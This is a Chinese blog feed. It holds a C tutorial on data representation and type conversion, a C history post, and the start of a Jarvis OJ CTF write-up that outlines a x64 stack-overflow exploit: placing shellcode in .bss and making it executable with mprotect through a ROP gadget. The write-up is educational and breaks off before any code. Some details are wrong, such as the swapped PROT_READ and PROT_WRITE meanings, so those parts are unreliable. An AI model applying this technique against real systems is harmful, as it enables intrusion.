-----------------------------------------</span><br><span class="line">   ?&lt;=  1000 0000 0000 0000 0000 0000 0000 0010</span><br></pre></td></tr></table></figure><blockquote><p>关键的要来了，机器会把<code>1000 0000 0000 0000 0000 0000 0000 0010</code>看做什么呢？</p><ul><li>如果是有符号的话，则它的原码为<code>1111 1111 1111 1111 1111 1111 1111 1100</code>，因为是有符号的，所以最高位为符号位，为1表示是负数，那么<code>1111111111111111111111111111110</code>(去掉符号位的二进制)的十进制为<code>2147483646</code>，再加上符号，那么就是<code>-2147483646</code></li><li>如果是无符号的话，则它的原码就是其本身，那么该二进制的十进制为<code>2147483650</code></li></ul><p>之所以出现上述结果，原因在于格式符<code>%d</code>和<code>%u</code>：</p><ul><li><code>%d</code>是输出<strong>带符号</strong>十进制定点格式，也就是说机器通过<code>%d</code>将本无意义的二进制看作有符号的数值，那么第一位是符号位；</li><li><code>%u</code>是输出<strong>无符号</strong>十进制定点格式，也就是说不管前面是如何定义的，在这里的输出机器就把二进制串解析成无符号的十进制；</li></ul></blockquote><p><code>小节总结：</code></p><blockquote><ul><li>数值在内存中都以补码的形式进行存储和计算；(为什么要以补码的形式呢，见参考文献[1])</li><li>数值是有符号还是无符号，看用户怎么使用</li></ul></blockquote><h4 id="font-color-blue2浮点数在内存的存储形式font"><a class="markdownIt-Anchor" href="#font-color-blue2浮点数在内存的存储形式font"></a> <font color="blue"><code>2.浮点数在内存的存储形式</code></font></h4><p>      首先要说明的是，这里我们不会对浮点数的具体知识点展开，比如精度问题。我们知道了整型数值在内存中是以其补码的形式进行存储的，那浮点数在内存中是以什么形式进行存储的呢？既然不太清楚，那我们就先用一个简单的例子来看一下浮点数的存储方式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> a = <span class="number">4.5</span>;<span class="comment">// 二进制形式为0000 0000 0000 0000 0000 0000 0000 0100.1</span></span><br><span class="line">    <span class="keyword">float</span> b = <span class="number">-4.5</span>;<span class="comment">// 二进制形式为1000 0000 0000 0000 0000 0000 0000 0100.1</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] a:%f\n[*] b:%f\n"</span>,a,b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>      我们将其程序编译为32位的ELF程序，用GDB看一下ａ和ｂ的存储形式，如下：</p><p><img src="/images/131-3.jpg" alt></p><p>      我们现在对比一下a和b的二进制形式和在计算机内存存放的形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ab</span><br><span class="line">数值自身形式：00000000000000000000000000000100.110000000000000000000000000000100.1</span><br><span class="line">内存中的存储：0100000010010000000000000000000011000000100100000000000000000000</span><br></pre></td></tr></table></figure><blockquote><p>可以看出数值本身的二进制形式和存放在内存中的形式完全不同，这是因为浮点数与整数的存储方式完全不同，根据<a href="https://en.wikipedia.org/wiki/IEEE_754" target="_blank" rel="noopener"><code>IEEE-754</code></a>标准，我们可以知道浮点数是以如下方式进行存储的：</p></blockquote><p><img src="/images/131-4.png" alt></p><blockquote><p>既然我们知道了相关的存储方式<sup>[2]</sup>，那么机器如何操作的呢？下面我们还是一上面的程序为例，看一下相关的汇编代码：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   ……</span><br><span class="line">   0x565561b0 &lt;+23&gt;:    add    eax,0x2e50</span><br><span class="line">   0x565561b5 &lt;+28&gt;:    fld    DWORD PTR [eax-0x1fe4]</span><br><span class="line">=&gt; 0x565561bb &lt;+34&gt;:    fstp   DWORD PTR [ebp-0xc]</span><br><span class="line">   0x565561be &lt;+37&gt;:    fld    DWORD PTR [eax-0x1fe0]</span><br><span class="line">   0x565561c4 &lt;+43&gt;:    fstp   DWORD PTR [ebp-0x10]</span><br><span class="line">   0x565561c7 &lt;+46&gt;:    fld    DWORD PTR [ebp-0xc]</span><br><span class="line">   0x565561ca &lt;+49&gt;:    fld    DWORD PTR [ebp-0x10]</span><br><span class="line">   0x565561cd &lt;+52&gt;:    sub    esp,0xc</span><br><span class="line">   ……</span><br></pre></td></tr></table></figure><blockquote><p>这里的<code>fld</code>、<code>fstp</code>指令是没有接触过，那么这里就简单介绍一下：</p></blockquote><p><code>fld指令</code></p><blockquote><p><code>指令格式</code>：FLD　STReg/MemReal    （STReg是处理器堆栈寄存器ST(0)~ST(7)）</p><p><code>指令功能</code>：将<strong>浮点数据压入<a href="https://zh.wikipedia.org/zh-hans/%E8%BC%94%E5%8A%A9%E8%99%95%E7%90%86%E5%99%A8" target="_blank" rel="noopener">协处理器</a>的堆栈中</strong>。当进行内存单元内容压栈时，系统会自动决定传送数据的精度。比如：用DD或REAL4定义的内存单元数值是单精度数等，类似于指令push</p></blockquote><p><code>fst指令</code>：</p><blockquote><p><code>指令格式</code>：FST STReg/MemReal</p><p><code>指令功能</code>：将<strong>协处理器堆栈栈顶的数据传送到目标操作数</strong>中。在进行数据传送时，系统自动根据控制寄存器中舍入控制位的设置把栈顶浮点数舍入成相应精度的数据。</p></blockquote><p><code>fstp指令</code></p><blockquote><p><code>指令格式</code>：FSTP STReg/MemReal</p><p><code>指令功能</code>：与FST相类似，所不同的是：指令FST执行完后，<strong>不进行堆栈的弹出操作</strong>，即：<strong>堆栈不发生变化</strong>，而指令FSTP执行完后，则需要进行堆栈的弹出操作，堆栈将发生变化。</p></blockquote><h3 id="font-color-navy0x01-数据常量font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-数据常量font"></a> <font color="navy"><code>0x01 数据常量</code></font></h3><h4 id="font-color-blue1字符和字符字面值font"><a class="markdownIt-Anchor" href="#font-color-blue1字符和字符字面值font"></a> <font color="blue"><code>1.字符和字符字面值</code></font></h4><p>      从一个程序开始我们的学习：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="string">'a'</span>;</span><br><span class="line">    <span class="keyword">char</span> b = <span class="string">'b'</span>;</span><br><span class="line">    <span class="keyword">char</span> c = <span class="number">0x63</span>;</span><br><span class="line">    <span class="keyword">int</span> d = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] a = %d(d) = %c(c)\n"</span>,a,a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] b = %d(d) = %c(c)\n"</span>,b,b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] c = %d(d) = %c(c)\n"</span>,c,c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] d = %d(d) = %c(c)\n"</span>,d,d);</span><br><span class="line">    b--;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] b-1 = %d(d) = %c(c)\n"</span>,b,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>结果如下</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[*] a = 97(d) = a(c)</span><br><span class="line">[*] b = 98(d) = b(c)</span><br><span class="line">[*] c = 99(d) = c(c)</span><br><span class="line">[*] d = 100(d) = d(c)</span><br><span class="line">[*] b-1 = 97(d) = a(c)</span><br></pre></td></tr></table></figure><p>      字面值就是一种记号而已，比如3，100，a,c，3.14。因为我们不能修改它（你能说把3改成5吗？）所以有时候又叫它常量。比如 int a = 100；a是一个int型变量，100就是一个字面值。字面值100只能用来作右值，不能作左值。<br>C语言中字符字面值是由一对<code>单引号括起来的单个字符</code>，比如’a’、‘b’。实际上字符字面值和整型字面值是一样的。编译器把字符字面值都当做整型字面值处理。比如：</p><ul><li>定义一个字符变量并用字符字面值来初始化：char ch = ‘a’；或者 char ch = 0x61；</li><li>定义一个int型变量并用字符字面值来初始化：int a = ‘a’；也是可以的，<code>printf(&quot;%d&quot;,a);</code>输出结果为<code>97</code></li></ul><p><code>总结</code></p><blockquote><ul><li>字符型可以和整型可以相互转化，在C语言中<code>字符型就是一种整型</code>，因为在内存中存储的是二进制形式，可以被解析成字符和字符字面值两个含义；</li><li>字符字面值是由单引号括起来的单个字符；</li></ul></blockquote><h3 id="font-color-navy0x02-数据类型转换font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-数据类型转换font"></a> <font color="navy"><code>0x02 数据类型转换</code></font></h3><h4 id="font-color-blue1类型提升font"><a class="markdownIt-Anchor" href="#font-color-blue1类型提升font"></a> <font color="blue"><code>1.类型提升</code></font></h4><p>      首先举一个简单的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">short</span> a= <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> b;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> c;</span><br><span class="line">b = a;</span><br><span class="line">c = a;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*]          short a = %d(d) = %u(u)\n"</span>,a,a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] unsigned short b = %d(d) = %u(u)\n"</span>,b,b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] unsigned int c = %d(d) = %u(u)\n"</span>,c,b);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>结果如下：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*]          short a = -1(d) = 4294967295(u)</span><br><span class="line">[*] unsigned short b = 65535(d) = 65535(u)</span><br><span class="line">[*] unsigned int c = -1(d) = 4294967295(u)</span><br></pre></td></tr></table></figure><p>      分析<code>printf的输出</code>，如下图：</p><p><img src="/images/131-5.png" alt></p><p><code>总结</code></p><blockquote><ul><li>有符号数按照有符号数的扩展规则（<strong>高位补符号位</strong>）扩展，无符号数按照无符号数的扩展规则（<strong>高位补0</strong>）扩展</li><li><strong>整型提升都解释为int</strong></li></ul></blockquote><h4 id="font-color-blue2类型降格font"><a class="markdownIt-Anchor" href="#font-color-blue2类型降格font"></a> <font color="blue"><code>2.类型降格</code></font></h4><p>      关于类型降格的相关知识点我只简单总结一下，大家可以自己写示例代码进行验证</p><blockquote><ul><li>当实数（浮点数）转换为整数时，实数的小数部分被全被舍去，只保留整数部分</li><li>当double类型转换为float类型，将去掉多余的数字，但按照四舍五入进行处理，这种会降低精度</li></ul></blockquote><h4 id="font-color-blue3显示转换font"><a class="markdownIt-Anchor" href="#font-color-blue3显示转换font"></a> <font color="blue"><code>3.显示转换</code></font></h4><p>      显示转换的方法有：<code>强制类型转换</code></p><h4 id="font-color-blue4隐式转换font"><a class="markdownIt-Anchor" href="#font-color-blue4隐式转换font"></a> <font color="blue"><code>4.隐式转换</code></font></h4><p>      隐式转换的方法有：</p><p><code>赋值转换</code></p><blockquote><p>通过赋值语句使符号右边表达式的值的类型自动转换为其左边变量的类型，如我们在类型提升中程序里面有关赋值的语句，如</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">3</span>,b;</span><br><span class="line">    <span class="keyword">short</span> i = <span class="number">4</span>,j;</span><br><span class="line">    j = a;<span class="comment">// int =&gt; short 类型降格</span></span><br><span class="line">    b = i;<span class="comment">// short =&gt; int 类型提升</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>一元转换</code></p><blockquote><p>将短型数扩展成机器处理的长度</p></blockquote><p><code>二元转换</code></p><blockquote><p>按照优先级顺序将各二元运算符的操作数提升为同一类型，长类型的优先级大于短类型的优先级</p></blockquote><p><code>输出转换</code></p><blockquote><p>比如我们前面讲到的<code>printf()</code>的格式符<code>%d</code>，是将数据类型提升/降格为<code>signed int</code>类型</p></blockquote><h3 id="font-colornavy0x04-referencefont"><a class="markdownIt-Anchor" href="#font-colornavy0x04-referencefont"></a> <font color="navy"><code>0x04 Reference</code></font></h3><p>[1] <a href="https://www.zhihu.com/question/30395946" target="_blank" rel="noopener">计算机补码运算背后的数学原理是什么？</a></p><p>[2] <a href="https://www.ruanyifeng.com/blog/2010/06/ieee_floating-point_representation.html" target="_blank" rel="noopener">浮点数的二进制表示</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-基本数据类型font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-基本数据类型font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="C" scheme="https://muzibing.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>【C语言学习系列一】 重新认识 C 语言</title>
    <link href="https://muzibing.github.io/2020/06/22/2020.06.22%EF%BC%88130%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/22/2020.06.22（130）/</id>
    <published>2020-06-21T16:00:00.000Z</published>
    <updated>2020-06-22T06:32:08.549Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy1c语言的历史font"><a class="markdownIt-Anchor" href="#font-color-navy1c语言的历史font"></a> <font color="navy"><code>1.C语言的历史</code></font></h3><p>      贝尔实验室的<code>Dennis Ritchie</code><font size="2">（1941－2011年）</font>为了给在<code>PDP-11</code>电脑上运行的Unix系统设计出一个系统级的编程语言，他在B语言的基础上创造了C语言，这是一门<code>高级编程语言</code>。</p><p><code>1969-1973年：早期的C语言</code></p><blockquote><ul><li><font size="2"><code>1969年</code>：<strong>基于 BCPL 创建 B</strong> ，以作为 Unix 的系统程序语言替代 PDP-7 汇编器</font></li><li><font size="2"><code>1971年</code>：于将 B 移植到<code>PDP-11</code> 时创建 NB （新“ B ”），也就是C语言的前身</font></li><li><font size="2"><code>1972年</code>：语言更名为 C</font></li><li><font size="2"><code>1973年</code>：Unix<a href="https://zh.wikipedia.org/wiki/%E4%BD%9C%E6%A5%AD%E7%B3%BB%E7%B5%B1" target="_blank" rel="noopener">操作系统</a>的核心正式用C语言改写，这是C语言第一次应用在操作系统的核心编写上</font></li></ul></blockquote><p>      C语言源于<a href="https://zh.wikipedia.org/wiki/BCPL" target="_blank" rel="noopener">BCPL语言</a>，后者由<a href="https://zh.wikipedia.org/wiki/%E9%A6%AC%E4%B8%81%C2%B7%E7%90%86%E5%AF%9F%E5%BE%B7" target="_blank" rel="noopener">马丁·理察德</a>（Martin Richards）于1967年左右设计实现。BCPL是一门&quot;无类型&quot;的编程语言：它仅能操作一种数据类型，即<a href="https://zh.wikipedia.org/wiki/%E5%AD%97_(%E8%AE%A1%E7%AE%97%E6%9C%BA)" target="_blank" rel="noopener">机器字</a>（machine word）。1970年，肯·汤普逊为运行在<a href="https://zh.wikipedia.org/wiki/PDP-7" target="_blank" rel="noopener">PDP-7</a>上的首个Unix系统设计了一个精简版的BCPL，这个语言被称为<a href="https://zh.wikipedia.org/wiki/B%E8%AF%AD%E8%A8%80" target="_blank" rel="noopener">B语言</a>，它也是无类型的。</p><p><br>      Unix最早运行在PDP-7上，是以<a href="https://zh.wikipedia.org/wiki/%E7%B5%84%E5%90%88%E8%AA%9E%E8%A8%80" target="_blank" rel="noopener">汇编语言</a>写成，在PDP-11出现后，丹尼斯·里奇与<a href="https://zh.wikipedia.org/wiki/%E8%82%AF%C2%B7%E6%B1%A4%E6%99%AE%E9%80%8A" target="_blank" rel="noopener">肯·汤普逊</a>着手将<a href="https://zh.wikipedia.org/wiki/Unix" target="_blank" rel="noopener">Unix</a>移植到PDP-11上，无类型的语言在<code>PDP-11</code>上愈发显得不合适。PDP-11提供了多种不同规格大小的基本对象：一字节长的字符，两字节长的整型数以及四字节长的浮点数。B语言无法处理这些不同规格大小的对象，也没有提供单独的操作符去操作它们。</p><p><br>      C语言最初尝试通过向B语言中增加数据类型的想法来处理那些不同类型的数据。和大多数语言一样，在C中，每个对象都有一个类型以及一个值；类型决定了可用于值的操作的含义，以及对象占用的存储空间大小。</p><p><br>      1973年，Unix<a href="https://zh.wikipedia.org/wiki/%E4%BD%9C%E6%A5%AD%E7%B3%BB%E7%B5%B1" target="_blank" rel="noopener">操作系统</a>的核心正式用C语言改写，这是C语言第一次应用在操作系统的核心编写上。</p><p><br><code>1974-至今：标准的C</code></p><blockquote><ul><li><font size="2"><code>1975年</code>：C语言开始移植到其他机器上使用</font></li><li><font size="2"><code>1978年</code>：<a href="https://zh.wikipedia.org/wiki/%E4%B8%B9%E5%B0%BC%E6%96%AF%C2%B7%E9%87%8C%E5%A5%87" target="_blank" rel="noopener">丹尼斯·里奇</a>和<a href="https://zh.wikipedia.org/wiki/%E5%B8%83%E8%90%8A%E6%81%A9%C2%B7%E6%9F%AF%E6%9E%97%E6%BC%A2" target="_blank" rel="noopener">布莱恩·柯林汉</a>合作出版了《<a href="https://zh.wikipedia.org/wiki/C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E8%AF%AD%E8%A8%80_(%E4%B9%A6)" target="_blank" rel="noopener">C程序设计语言</a>》( The C Programming Language )的第一版</font></li></ul></blockquote><hr><p>      下面给出一个C语言的发展时间轴：</p><p><img src="/images/130-1.jpg" alt></p><blockquote><ul><li><font size="2"><code>1954年-Fortran</code>：是世界上第一个被正式采用并流传至今的<a href="https://zh.wikipedia.org/wiki/%E9%AB%98%E9%9A%8E%E8%AA%9E%E8%A8%80" target="_blank" rel="noopener">高级编程语言</a>，由IBM开发完成</font></li><li><font size="2"><code>1958年-IAL(ALGOL)</code>：ALGOL被设计用来避免FORTRAN中一些已知的问题，最终引领了许多其它编程语言的兴起，包括<a href="https://zh.wikipedia.org/wiki/PL/I" target="_blank" rel="noopener">PL/I</a>、<a href="https://zh.wikipedia.org/wiki/Simula" target="_blank" rel="noopener">Simula</a>、<a href="https://zh.wikipedia.org/wiki/BCPL" target="_blank" rel="noopener">BCPL</a>、<a href="https://zh.wikipedia.org/wiki/B%E8%AA%9E%E8%A8%80" target="_blank" rel="noopener">B</a>、<a href="https://zh.wikipedia.org/wiki/Pascal_(%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80)" target="_blank" rel="noopener">Pascal</a>及<a href="https://zh.wikipedia.org/wiki/C%E8%AF%AD%E8%A8%80" target="_blank" rel="noopener">C</a></font></li><li><font size="2"><code>1958年-ALGOL58</code>：由IAL（国际代数语言，International Algebraic Language）改名而来。<a href="https://zh.wikipedia.org/wiki/ALGOL" target="_blank" rel="noopener">ALGOL</a>家族的第一个成员。它在1958年问世，<a href="https://zh.wikipedia.org/wiki/ALGOL_60" target="_blank" rel="noopener">ALGOL 60</a>即是它的基础上开发而成</font></li><li><font size="2"><code>1960年-ALGOL60</code>：ALGOF60是一种面向问题的高级语言，它离硬件比较远，不宜用来编写系统程序。</font></li><li><font size="2"><code>1963年-CPL</code>：CPL是1963年剑桥大学发明的，CPL语言在<a href="https://zh.wikipedia.org/wiki/ALGOL_60" target="_blank" rel="noopener">ALGOL 60</a>的基础上更接近硬件一些，但规模比较大，难以实现</font></li><li><font size="2"><code>1967年-BCPL</code>：是一种计算机程序设计语言，源自更早的<a href="https://zh.wikipedia.org/wiki/CPL_(%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80)" target="_blank" rel="noopener">CPL</a>语言，1966年由剑桥大学的<a href="https://zh.wikipedia.org/wiki/%E9%A6%AC%E4%B8%81%C2%B7%E7%90%86%E5%AF%9F%E5%BE%B7" target="_blank" rel="noopener">马丁·理察德</a>所发展出来的。Richards试着移除了CPL中最复杂的组成，第一支BCPL compiler在<a href="https://zh.wikipedia.org/w/index.php?title=IBM_7094&amp;action=edit&amp;redlink=1" target="_blank" rel="noopener">IBM 7094</a>电脑中完成</font></li><li><font size="2"><code>1969年-B</code>：贝尔实验室的Ken Thompson（肯·汤普森） 对BCPL又做了改进，设计出了简单的且接近硬件的B语言，并用B语言写了第一个UNIX OS。</font></li><li><font size="2"><code>1971年-C</code>：贝尔实验室的另外一个人Dennis MacAlistair Ritchie（D.M.Ritchie - DM里奇）在B的基础上设计出了C语言。C 保持了B的优点（精炼、接近硬件），又克服了他的缺点（过于简单，数据无类型），至此C语言渐渐发展成为目前世界上最常用的编程语言之一。</font></li></ul></blockquote><h3 id="font-color-navy2重新学习c语言的理由font"><a class="markdownIt-Anchor" href="#font-color-navy2重新学习c语言的理由font"></a> <font color="navy"><code>2.重新学习C语言的理由</code></font></h3><p>      接触C语言是在大一上学期，这也是我第一次接触编程，那个时候对C语言的学习可真谓云里雾里，对于C语言中一些知识点不能够很好的知道其原理，比如<code>一个程序的变量被存放在哪里了？指针到底是个什么东西？</code>等等一系列问题，导致在学习过程中可谓困难重重，对计算机慢慢产生了畏难情绪。在经过一段时间的学习，我认为在学习C语言之前更应该先去学习计算机中的一些理念和想法，比如<code>可执行文件的加载过程；程序是如何被运行的；在程序运行过程中，栈扮演了什么样的角色？</code>等等，所以在简单的了解了这些原理以后，我决定再来重新学习C语言，以便彻底的了解其整个运行机制和原理。</p><p>      我参考的书籍有：《C语言程序设计语言》(第2版)和《C语言程序设计教程》(第3版)</p><h3 id="font-color-navy3学习计划font"><a class="markdownIt-Anchor" href="#font-color-navy3学习计划font"></a> <font color="navy"><code>3.学习计划</code></font></h3><p>     现在计划10期将C语言学完，每一期的计划如下：</p><blockquote><p>第一期：数据类型</p><p>第二期：流程控制</p><p>第三期：函数和程序结构</p><p>第四期：数组</p><p>第五期：指针（上）</p><p>第六期：指针（下）</p><p>第七期：结构（体）</p><p>第八期：链表</p><p>第九期：文件</p><p>第十期：总结</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy1c语言的历史font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy1c语言的历史font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;1.C语言的历史&lt;/
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="C" scheme="https://muzibing.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>【Jarvis OJ-PWN】level5（x64下的栈溢出漏洞）</title>
    <link href="https://muzibing.github.io/2020/06/20/2020.06.20%EF%BC%88129%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/20/2020.06.20（129）/</id>
    <published>2020-06-19T16:00:00.000Z</published>
    <updated>2020-06-20T15:29:43.370Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/129-1.jpg" alt></p><h3 id="font-color-brown0x00-相关知识font"><a class="markdownIt-Anchor" href="#font-color-brown0x00-相关知识font"></a> <font color="brown"><code>0x00 相关知识</code></font></h3><h4 id="font-color-navy1mprotect函数font"><a class="markdownIt-Anchor" href="#font-color-navy1mprotect函数font"></a> <font color="navy"><code>1.mprotect()函数</code></font></h4><p>      <code>mprotect()</code>函数可以修改调用进程内存页的保护属性。如果调用进程尝试以违反保护属性的方式访问该内存，则内核会发出一个<code>SIGSEGV</code>信号给该进程。</p><ul><li><p>函数原型：<code>int mprotect(const void *start, size_t len, int prot)</code></p></li><li><p>参数解释：</p><ul><li>start：需改写属性的内存中开始地址</li><li>len：需改写属性的内存长度</li><li>prot：需要修改为的指定值</li></ul></li><li><p>功能： mprotect()函数可以用来修改一段指定内存区域的保护属性。 他把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。 prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：</p><p>1）PROT_READ：表示内存段内的内容可写；</p><p>2）PROT_WRITE：表示内存段内的内容可读；</p><p>3）PROT_EXEC：表示内存段中的内容可执行；</p><p>4）PROT_NONE：表示内存段中的内容根本没法访问。</p></li><li><p><code>注意</code>：指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。</p><p>prot=7 是可读可写可执行</p></li></ul><h4 id="font-color-navy2_libc_csu_init通用gadgetfont"><a class="markdownIt-Anchor" href="#font-color-navy2_libc_csu_init通用gadgetfont"></a> <font color="navy"><code>2.&lt;_libc_csu_init&gt;通用gadget</code></font></h4><blockquote><p>详情可以看一下我前面写过的一篇<a href="https://muzibing.github.io/2020/06/17/2020.06.17%EF%BC%88128%EF%BC%89/">博文</a></p></blockquote><h3 id="font-color-brown0x01-题目分析font"><a class="markdownIt-Anchor" href="#font-color-brown0x01-题目分析font"></a> <font color="brown"><code>0x01 题目分析</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file level3_x64 </span><br><span class="line">level3_x64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f01f8fd41061f9dafb9399e723eb52d249a9b34d, not stripped</span><br></pre></td></tr></table></figure><blockquote><p>该文件是一个64位的ELF可执行文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec level3_x64 </span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/Jarvis OJ/pwn/level5/level3_x64&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><blockquote><p>只开启了栈不可执行保护，下面看一下伪代码</p></blockquote><p><img src="/images/129-2.png" alt></p><p><img src="/images/129-3.png" alt></p><blockquote><p>从上面的伪代码中很容易看出<code>vul()</code>函数存在着栈溢出漏洞，<code>buf</code>能输入的值要远远大于被分配的值，所以漏洞点在这。但是由于<code>system()</code>函数和<code>execve()</code>函数被禁用了，也就是说我们无法通过这两个函数执行shellcode，那么题目给了提示<code>请尝试使用mmap和mprotect完成本题。</code>，对于<code>mmap</code>函数还不太了解，所以在这里我们使用<code>mprotect()</code>函数，该函数可以修改调用进程内存页的保护属性，那么我们以将我们的shellcode放入<code>.bss</code>段中，然后将<code>.bss</code>段的权限修改为可执行，然后再跳转到<code>.bss</code>段执行shellcode，那么下面我们怎么将shellcode写入<code>.bss</code>段中呢？</p></blockquote><p><code>1.将mprotect的地址和shellcode写入.bss段中</code></p><p>      我们可以利用read函数将shellcode写入<code>.bss</code>段中，之所以也将<code>mprotect</code>函数的地址也写入<code>.bss</code>段中，是因为通用gadget中的<code>callq *(%r12,%rbx,8)</code>，如果rbx为0，那么这里就是将r12中表示的地址的值作为函数地址，比如<code>r12 = 1</code>，而地址1中的值为<code>2</code>，那么就是调用地址<code>2</code>中的函数，这一点需要注意</p><p><code>2.使用mprotect()函数修改.bss段的权限</code></p><p>      